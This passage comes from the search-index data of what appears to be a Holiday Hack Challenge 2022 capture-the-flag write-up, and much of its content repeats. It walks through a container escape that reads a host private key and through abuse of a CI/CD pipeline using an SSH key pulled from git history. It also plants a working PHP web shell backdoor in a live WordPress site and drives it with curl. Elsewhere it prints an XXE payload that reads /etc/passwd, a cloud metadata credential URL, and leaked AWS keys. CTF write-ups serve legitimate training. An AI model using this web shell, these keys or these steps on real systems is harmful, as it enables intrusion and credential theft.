Objective Talk to Bow Ninecandle for the next objective. Solve","title":"2.2 Find the Next Objective"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.2_Find_the_Next_Objective.html#recover-the-elfen-ring","text":"","title":"Recover the Elfen Ring"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.2_Find_the_Next_Objective.html#22-find-the-next-objective","text":"Talk to Bow Ninecandle for the next objective.","title":"2.2 Find the Next Objective"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.2_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html","text":"Recover the Elfen Ring 2.3 Prison Escape Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv ? Hint(s) Solve ANSWER: 082bb339ec19de4935867 Terminal answers grinchum-land:/tmp# fdisk -l Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors 2048 cylinders, 64 heads, 32 sectors/track Units: sectors of 1 * 512 = 512 bytes Disk /dev/vda doesn't contain a valid partition table grinchum-land:/tmp# mkdir -p /mnt/hola grinchum-land:/tmp# mount /dev/vda /mnt/hola grinchum-land:/tmp# cd /mnt/hola/ grinchum-land:/mnt/hola# ls bin dev home lib32 libx32 media opt root sbin sys usr boot etc lib lib64 lost+found mnt proc run srv tmp var grinchum-land:/mnt/hola# cd home/ grinchum-land:/mnt/hola/home# ls jailer grinchum-land:/mnt/hola/home# cd jailer/ grinchum-land:/mnt/hola/home/jailer# ls grinchum-land:/mnt/hola/home/jailer# ls -la total 12 drwxr-xr-x 3 root root 4096 Dec 1 19:12 . drwxr-xr-x 3 root root 4096 Dec 1 19:12 .. drwxr-xr-x 2 root root 4096 Dec 1 19:12 .ssh grinchum-land:/mnt/hola/home/jailer# grinchum-land:/mnt/hola/home/jailer# cd .ssh/ grinchum-land:/mnt/hola/home/jailer/.ssh# ls jail.key.priv jail.key.pub grinchum-land:/mnt/hola/home/jailer/.ssh# cat jail.key.priv","title":"2.3 Prison Escape"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html#recover-the-elfen-ring","text":"","title":"Recover the Elfen Ring"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html#23-prison-escape","text":"Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv ?","title":"2.3 Prison Escape"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html#solve","text":"ANSWER: 082bb339ec19de4935867","title":"Solve"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html#terminal-answers","text":"grinchum-land:/tmp# fdisk -l Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors 2048 cylinders, 64 heads, 32 sectors/track Units: sectors of 1 * 512 = 512 bytes Disk /dev/vda doesn't contain a valid partition table grinchum-land:/tmp# mkdir -p /mnt/hola grinchum-land:/tmp# mount /dev/vda /mnt/hola grinchum-land:/tmp# cd /mnt/hola/ grinchum-land:/mnt/hola# ls bin dev home lib32 libx32 media opt root sbin sys usr boot etc lib lib64 lost+found mnt proc run srv tmp var grinchum-land:/mnt/hola# cd home/ grinchum-land:/mnt/hola/home# ls jailer grinchum-land:/mnt/hola/home# cd jailer/ grinchum-land:/mnt/hola/home/jailer# ls grinchum-land:/mnt/hola/home/jailer# ls -la total 12 drwxr-xr-x 3 root root 4096 Dec 1 19:12 . drwxr-xr-x 3 root root 4096 Dec 1 19:12 .. drwxr-xr-x 2 root root 4096 Dec 1 19:12 .ssh grinchum-land:/mnt/hola/home/jailer# grinchum-land:/mnt/hola/home/jailer# cd .ssh/ grinchum-land:/mnt/hola/home/jailer/.ssh# ls jail.key.priv jail.key.pub grinchum-land:/mnt/hola/home/jailer/.ssh# cat jail.key.priv","title":"Terminal answers"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.4_Find_the_Next_Objective.html","text":"Recover the Elfen Ring 2.4 Find the Next Objective Talk to Tinsel Upatree for the next objective. Solve","title":"2.4 Find the Next Objective"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.4_Find_the_Next_Objective.html#recover-the-elfen-ring","text":"","title":"Recover the Elfen Ring"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.4_Find_the_Next_Objective.html#24-find-the-next-objective","text":"Talk to Tinsel Upatree for the next objective.","title":"2.4 Find the Next Objective"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.4_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html","text":"Recover the Elfen Ring 2.5 Jolly CI/CD Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring. Hint(s) Solve ANSWER: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT Terminal answers 1.- Clone the gitlab repo available: grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Cloning into 'wordpress.flag.net.internal'... remote: Enumerating objects: 10195, done. remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195 Receiving objects: 100% (10195/10195), 36.49 MiB | 20.74 MiB/s, done. Resolving deltas: 100% (1799/1799), done. Updating files: 100% (9320/9320), done. grinchum-land:~$ 2.- List the commit log available: grinchum-land:~/wordpress.flag.net.internal$ git log | more commit 37b5d575bf81878934adb937a4fff0d32a8da105 Author: knee-oh <sporx@kringlecon.com> Date: Wed Oct 26 13:58:15 2022 -0700 [../snip] 3.- Notice the commit with ID abdea0ebb21b156c01f7533cea3b895c26198c98 is exposing the SSH keys, extract those keys: grinchum-land:~/wordpress.flag.net.internal$ git show abdea0ebb21b156c01f7533cea3b895c26198c98:.ssh/.deploy.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com grinchum-land:~/wordpress.flag.net.internal$ git show abdea0ebb21b156c01f7533cea3b895c26198c98:.ssh/.deploy -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== -----END OPENSSH PRIVATE KEY----- 4.- Add those keys into .ssh grinchum profile: grinchum-land:~$ mkdir .ssh && touch .ssh/id_rsa.pub && touch .ssh/id_rsa grinchum-land:~$ echo ' ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com' >> .ssh/id_rsa.pub grinchum-land:~$ echo -n ' private key here '' <- do manually due format errors grinchum-land:~$ chmod 400 .ssh/id_rsa && chmod 400 .ssh/id_rsa.pub grinchum-land:~/.ssh$ eval \"$(ssh-agent -s)\" Agent pid 460 5.- Test your connectivity to the server (note: gitlab target are not allowed ssh connections) grinchum-land:~$ ssh -T git@gitlab.flag.net.internal Welcome to GitLab, @knee-oh! 6.- Add the global git config for user and private keys: grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email \"sporx@kringlecon.com\" grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name \"knee-oh\" grinchum-land:~/wordpress.flag.net.internal$ git config core.sshCommand 'ssh -i /home/samways/.ssh/id_rsa' 7.- Test your gitlab permissions: grinchum-land:~/wordpress.flag.net.internal$ touch alex2.txt grinchum-land:~/wordpress.flag.net.internal$ echo 'anoter file' >> alex2.txt grinchum-land:~/wordpress.flag.net.internal$ git add . grinchum-land:~/wordpress.flag.net.internal$ git commit -a --allow-empty-message -m 'My test2' grinchum-land:~/wordpress.flag.net.internal$ git push grinchum-land:~/wordpress.flag.net.internal$ git log commit 64c3d6af84d1c4b5955fd923d8eef0183419dc33 (HEAD -> main) Author: knee-oh <sporx@kringlecon.com> Date: Mon Dec 12 01:19:53 2022 +0000 Erased by Alex <-- Voila ! good commit cc2df0953e632492b7782074d44ab9d47ea912d3 (origin/main, origin/HEAD) Author: knee-oh <sporx@kringlecon.com> Date: Mon Dec 12 01:14:21 2022 +0000 My test2 <-- Voila ! good 8.- Modify some file e.g \"readme.html\" from wordpress portal to see if the changes are reflected for Live Environment: rinchum-land:~/wordpress.flag.net.internal$ echo 'alt3kx was here' >> readme.html grinchum-land:~/wordpress.flag.net.internal$ git add . grinchum-land:~/wordpress.flag.net.internal$ git commit -a --allow-empty-message -m 'readme.html modified' grinchum-land:~/wordpress.flag.net.internal$ git push 9.- Call the portal using curl command with full path \"readme.html\", find the string previously added into source code: $ curl http://wordpress.flag.net.internal/readme.html [../snip] alt3kx was here! </body> </html> [../snip] 10.- Wordpress porta allowed php files, upload the phpshell as backdoor into plugins directory: grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ pwd /home/samways/wordpress.flag.net.internal/wp-content/plugins/shell grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ ls -la total 16 drwxr-xr-x 2 samways users 4096 Dec 12 02:21 . drwxr-xr-x 19 samways users 4096 Dec 12 02:10 .. -rw-r--r-- 1 samways users 2698 Dec 12 02:09 shell.php -rw-r--r-- 1 samways users 302 Dec 12 02:21 shell2.php grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ cat shell2.php ---shell2.php--- <html> <body> <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"> <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"> <input type=\"SUBMIT\" value=\"Execute\"> </form> <pre> <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body> </html> ---shell2.php--- grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ 11.- Commit the changes for wordpress portal Live Environment: grinchum-land:~/wordpress.flag.net.internal$ git add . grinchum-land:~/wordpress.flag.net.internal$ git commit -a -m 'shell' grinchum-land:~/wordpress.flag.net.internal$ git push 12.- Call the portal using curl command with full path of phpshell e.g \"/wp-content/plugins/shell/shell2.php?cmd=ls+/\" grinchum-land:~/wordpress.flag.net.internal$ curl -v \"http://wordpress.flag.net.internal/wp-content/plugins/shell/shell2.php?cmd=ls+/\" 13.- Now just call the flag.txt file using curl command with full path e.g \"wp-content/plugins/shell/shell2.php?cmd=cat+/flag.txt\" grinchum-land:~/wordpress.flag.net.internal$ curl -v \"http://wordpress.flag.net.internal/wp-content/plugins/shell/shell2.php?cmd=cat+/flag.txt\" 14.- See the flag.txt file content FLAG: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT","title":"2.5 Jolly CI/CD"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html#recover-the-elfen-ring","text":"","title":"Recover the Elfen Ring"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html#25-jolly-cicd","text":"Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.","title":"2.5 Jolly CI/CD"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html#solve","text":"ANSWER: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT","title":"Solve"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html#terminal-answers","text":"1.- Clone the gitlab repo available: grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Cloning into 'wordpress.flag.net.internal'... remote: Enumerating objects: 10195, done. remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195 Receiving objects: 100% (10195/10195), 36.49 MiB | 20.74 MiB/s, done. Resolving deltas: 100% (1799/1799), done. Updating files: 100% (9320/9320), done. grinchum-land:~$ 2.- List the commit log available: grinchum-land:~/wordpress.flag.net.internal$ git log | more commit 37b5d575bf81878934adb937a4fff0d32a8da105 Author: knee-oh <sporx@kringlecon.com> Date: Wed Oct 26 13:58:15 2022 -0700 [../snip] 3.- Notice the commit with ID abdea0ebb21b156c01f7533cea3b895c26198c98 is exposing the SSH keys, extract those keys: grinchum-land:~/wordpress.flag.net.internal$ git show abdea0ebb21b156c01f7533cea3b895c26198c98:.ssh/.deploy.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com grinchum-land:~/wordpress.flag.net.internal$ git show abdea0ebb21b156c01f7533cea3b895c26198c98:.ssh/.deploy -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== -----END OPENSSH PRIVATE KEY----- 4.- Add those keys into .ssh grinchum profile: grinchum-land:~$ mkdir .ssh && touch .ssh/id_rsa.pub && touch .ssh/id_rsa grinchum-land:~$ echo ' ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com' >> .ssh/id_rsa.pub grinchum-land:~$ echo -n ' private key here '' <- do manually due format errors grinchum-land:~$ chmod 400 .ssh/id_rsa && chmod 400 .ssh/id_rsa.pub grinchum-land:~/.ssh$ eval \"$(ssh-agent -s)\" Agent pid 460 5.- Test your connectivity to the server (note: gitlab target are not allowed ssh connections) grinchum-land:~$ ssh -T git@gitlab.flag.net.internal Welcome to GitLab, @knee-oh! 6.- Add the global git config for user and private keys: grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email \"sporx@kringlecon.com\" grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name \"knee-oh\" grinchum-land:~/wordpress.flag.net.internal$ git config core.sshCommand 'ssh -i /home/samways/.ssh/id_rsa' 7.- Test your gitlab permissions: grinchum-land:~/wordpress.flag.net.internal$ touch alex2.txt grinchum-land:~/wordpress.flag.net.internal$ echo 'anoter file' >> alex2.txt grinchum-land:~/wordpress.flag.net.internal$ git add . grinchum-land:~/wordpress.flag.net.internal$ git commit -a --allow-empty-message -m 'My test2' grinchum-land:~/wordpress.flag.net.internal$ git push grinchum-land:~/wordpress.flag.net.internal$ git log commit 64c3d6af84d1c4b5955fd923d8eef0183419dc33 (HEAD -> main) Author: knee-oh <sporx@kringlecon.com> Date: Mon Dec 12 01:19:53 2022 +0000 Erased by Alex <-- Voila ! good commit cc2df0953e632492b7782074d44ab9d47ea912d3 (origin/main, origin/HEAD) Author: knee-oh <sporx@kringlecon.com> Date: Mon Dec 12 01:14:21 2022 +0000 My test2 <-- Voila ! good 8.- Modify some file e.g \"readme.html\" from wordpress portal to see if the changes are reflected for Live Environment: rinchum-land:~/wordpress.flag.net.internal$ echo 'alt3kx was here' >> readme.html grinchum-land:~/wordpress.flag.net.internal$ git add . grinchum-land:~/wordpress.flag.net.internal$ git commit -a --allow-empty-message -m 'readme.html modified' grinchum-land:~/wordpress.flag.net.internal$ git push 9.- Call the portal using curl command with full path \"readme.html\", find the string previously added into source code: $ curl http://wordpress.flag.net.internal/readme.html [../snip] alt3kx was here! </body> </html> [../snip] 10.- Wordpress porta allowed php files, upload the phpshell as backdoor into plugins directory: grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ pwd /home/samways/wordpress.flag.net.internal/wp-content/plugins/shell grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ ls -la total 16 drwxr-xr-x 2 samways users 4096 Dec 12 02:21 . drwxr-xr-x 19 samways users 4096 Dec 12 02:10 .. -rw-r--r-- 1 samways users 2698 Dec 12 02:09 shell.php -rw-r--r-- 1 samways users 302 Dec 12 02:21 shell2.php grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ cat shell2.php ---shell2.php--- <html> <body> <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"> <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"> <input type=\"SUBMIT\" value=\"Execute\"> </form> <pre> <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body> </html> ---shell2.php--- grinchum-land:~/wordpress.flag.net.internal/wp-content/plugins/shell$ 11.- Commit the changes for wordpress portal Live Environment: grinchum-land:~/wordpress.flag.net.internal$ git add . grinchum-land:~/wordpress.flag.net.internal$ git commit -a -m 'shell' grinchum-land:~/wordpress.flag.net.internal$ git push 12.- Call the portal using curl command with full path of phpshell e.g \"/wp-content/plugins/shell/shell2.php?cmd=ls+/\" grinchum-land:~/wordpress.flag.net.internal$ curl -v \"http://wordpress.flag.net.internal/wp-content/plugins/shell/shell2.php?cmd=ls+/\" 13.- Now just call the flag.txt file using curl command with full path e.g \"wp-content/plugins/shell/shell2.php?cmd=cat+/flag.txt\" grinchum-land:~/wordpress.flag.net.internal$ curl -v \"http://wordpress.flag.net.internal/wp-content/plugins/shell/shell2.php?cmd=cat+/flag.txt\" 14.- See the flag.txt file content FLAG: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT","title":"Terminal answers"},{"location":"Objectives/3_Recover_the_Web_Ring/3.1_Naughty_IP.html","text":"Recover the Web Ring 3.1 Naughty IP Use the artifacts https://storage.googleapis.com/hhc22_player_assets/boriaArtifacts.zip from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Tolkien Ring for hints. Hint(s) Solve ANSWER: 18.222.86.32 Terminal answers Filter: ip.src==18.222.86.32 && ip.dst==10.12.42.16 Observe the top talker HTTP IP addresses 18.222.86.32","title":"3.1 Naught IP"},{"location":"Objectives/3_Recover_the_Web_Ring/3.1_Naughty_IP.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.1_Naughty_IP.html#31-naughty-ip","text":"Use the artifacts https://storage.googleapis.com/hhc22_player_assets/boriaArtifacts.zip from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Tolkien Ring for hints.","title":"3.1 Naughty IP"},{"location":"Objectives/3_Recover_the_Web_Ring/3.1_Naughty_IP.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/3_Recover_the_Web_Ring/3.1_Naughty_IP.html#solve","text":"ANSWER: 18.222.86.32","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.1_Naughty_IP.html#terminal-answers","text":"Filter: ip.src==18.222.86.32 && ip.dst==10.12.42.16 Observe the top talker HTTP IP addresses 18.222.86.32","title":"Terminal answers"},{"location":"Objectives/3_Recover_the_Web_Ring/3.2_Credential_Mining.html","text":"Recover the Web Ring 3.2 Credential Mining The first attack is a brute force https://owasp.org/www-community/attacks/Brute_force_attack login. What's the first username tried? Hint(s) Solve ANSWER: alice Terminal answers $ tshark -r victim.pcap -Y \"http.request.method == POST\" -T fields -e text | more","title":"3.2 Credential Mining"},{"location":"Objectives/3_Recover_the_Web_Ring/3.2_Credential_Mining.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.2_Credential_Mining.html#32-credential-mining","text":"The first attack is a brute force https://owasp.org/www-community/attacks/Brute_force_attack login. What's the first username tried?","title":"3.2 Credential Mining"},{"location":"Objectives/3_Recover_the_Web_Ring/3.2_Credential_Mining.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/3_Recover_the_Web_Ring/3.2_Credential_Mining.html#solve","text":"ANSWER: alice","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.2_Credential_Mining.html#terminal-answers","text":"$ tshark -r victim.pcap -Y \"http.request.method == POST\" -T fields -e text | more","title":"Terminal answers"},{"location":"Objectives/3_Recover_the_Web_Ring/3.3_404_FTW.html","text":"Recover the Web Ring 3.3 404 FTW The next attack is forced browsing https://owasp.org/www-community/attacks/Forced_browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack? Hint(s) Solve ANSWER: /proc Terminal answers $ tshark -r victim.pcap -Y \"http.request.method == GET\" -T fields -e text | sort | uniq -c | sort -nr | head","title":"3.3 404 FTW"},{"location":"Objectives/3_Recover_the_Web_Ring/3.3_404_FTW.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.3_404_FTW.html#33-404-ftw","text":"The next attack is forced browsing https://owasp.org/www-community/attacks/Forced_browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack?","title":"3.3 404 FTW"},{"location":"Objectives/3_Recover_the_Web_Ring/3.3_404_FTW.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/3_Recover_the_Web_Ring/3.3_404_FTW.html#solve","text":"ANSWER: /proc","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.3_404_FTW.html#terminal-answers","text":"$ tshark -r victim.pcap -Y \"http.request.method == GET\" -T fields -e text | sort | uniq -c | sort -nr | head","title":"Terminal answers"},{"location":"Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html","text":"Recover the Web Ring 3.4 IMDS, XXE, and Other Abbreviations The last step in this attack was to use XXE https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing to get secret keys from the IMDS service. What URL did the attacker force the server to fetch? Hint(s) Solve ANSWER: http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance Terminal answers 1.- See pcap filter by protocol observe in detail the request with HTTP/XML http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance GET /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.0 Host: 169.254.169.254 Accept-Encoding: gzip HTTP/1.0 200 OK Accept-Ranges: bytes Content-Length: 1514 Content-Type: text/plain Date: Wed, 05 Oct 2022 16:48:57 GMT Last-Modified: Wed, 05 Oct 2022 16:42:35 GMT Connection: close Server: EC2ws { \"Code\" : \"Success\", \"LastUpdated\" : \"2022-10-05T16:43:21Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIAV4AVRXQVJ267LD2Q\", \"SecretAccessKey\" : \"OpGR4v70ygZ3RFf4WTzjNL45pQayRwZgBUgd0LJT\", \"Token\" : \"IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMiJHMEUCIHDsZXiUuHIUrLNH5pAeMiv4aUMVIScjwbo1E9LctQ3rAiEA819eJ24mILbxM3eELK2xrgskHxsRmrza/jIj3y96/sgqsgQI2v//////////ARADGgw0MDM3NzIxMjgyOTgiDMAdG5EGamJ4Z2FwyiqGBPy+CL9AfXIGfLBBDCNkCyl5WOMN7owHr84k+hz4XZYBUp7/+KFZgEiKARroMuD6ofdNRvAj7dQ1/wFxeR6wezUPUkHqtc303oTBY7eTk5EQXClpKsmV1l25QAfD0DOL6FPxpjLPug0AbDFlIhjUeImvk3NBWiUHtXptrJH2ksSaQqU2DBPkkQ4IjMBMbLj0ZdJVWaiUy9sf5ecc2d/qVQU1c6SrYLg0HpyuH9brqm0zuv8/tR17Y/Jo2aNeNGX1wvyb5jP1FcQteypV6IqKIUUCADJ7chYeMypMlwV77phvrZco921O6MV+JlhSIomuzFRLdvzD+RP8DyLZeYZ65vKzr6h0yc+XIHOCT+P01pWQgfZBtvfCJKLKqwTMEbIr/i/xgGmHoCTzx6m38kd4EZvGXZMp3EEasdnqTtKLOR6JFAAlW8SoxOKRL1MshK3SUmYvWnMoLKCotPwyJeAMHEHuZipNMiZ2gbN//PMbUBnPjNVFBP4SfHaTv7EHzHNpTl5toy8qlPyxE0yLbh5a//DF5wJQE6UKfXWlQhk9/NVM7QAAzEzWPiFTp8ajRIDjPoprVlX3yUaTUHOH8PwMtURCJLl0sOQaJtRGWEMrH52ls5e83pm0ta8257vu8HyTR7zgc/7a0ZsoxetlsB7VYIKyXnETO7SMniTO8R/yE1Wn9qAoWp/jMPvn9pkGOo8CLegclGA49hB/LRr/V1bXEyIIRg5Zn93xXvccMX5QyKGVSRghNOVGn/cCglDWc9zSRFRlZ4tHblVi1v8021J04REPR69FDuVvpUzEDJfDF1u4XwYGsp7uuuIngiiegP56H5nSYjmpBfyIURwgNvsz6ptpUvplGCxOvBJcKeyborHJDKG40QRXsLpOgB8NTKhgaFNxO7PjA/YrT7g1rYS7xNrKzVIK4tTwxWB5zN5JAQ3pVRp2JB8Q1ng3qsj3UPfZ3O3JjY4U+rrBKPEHIw9B+Pz6kffOu73aPKgo333w/hd9U4slj74JQXPhO9jCYpAF1bLdS/If20Ed6HvGcAONep0A/FrtZ62EWX4HmeYZ4A==\", \"Expiration\" : \"2022-10-05T23:00:40Z\" ``` Extra info attacker: ```ruby POST /proc HTTP/1.1 Host: www.toteslegit.us User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.37) Gecko/20100101 Firefox/12.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Cookie: SiteCookie=eyJjb21wYW55IjoiTGVnaXRCcmVhZCIsImxldmVsIjoiYWRtaW4iLCJ1c2VyIjoiYm9iIn0.Yz21Ew.idT7R5CEcAB_uJD221WwmKYG5QM Content-Type: application/xml Content-Length: 146 <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> <foo>&xxe;</foo> HTTP/1.1 200 OK Server: Werkzeug/2.2.2 Python/3.8.10 Date: Wed, 05 Oct 2022 16:48:32 GMT Content-Type: text/html; charset=utf-8 Content-Length: 1875 Connection: close <html><body> <pre><foo>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false </foo></pre> </body></html> attacker 18.222.86.32","title":"3.4 IMDS XXE and Other Abbreviations"},{"location":"Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html#34-imds-xxe-and-other-abbreviations","text":"The last step in this attack was to use XXE https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?","title":"3.4 IMDS, XXE, and 